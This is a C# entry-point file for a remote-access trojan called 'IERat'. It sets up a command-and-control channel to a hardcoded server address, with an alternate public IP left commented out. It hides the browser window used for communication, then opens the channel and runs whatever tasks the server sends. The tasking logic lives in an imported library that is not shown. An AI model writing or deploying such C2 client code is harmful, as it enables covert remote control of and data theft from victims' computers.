using IERat.lib;

namespace IERat
{
    class IERat
    {
        public static Channel channel = new Channel {
            BaseURL = "http://192.168.135.1:1337",
            //BaseURL = "http://3.68.73.27:443",
            SleepTime = 3000,
            IEvisible = false
        };

        static void Main()
        {
            channel.Open();
            channel.agent.ExecuteTasks();
        }
    }
}
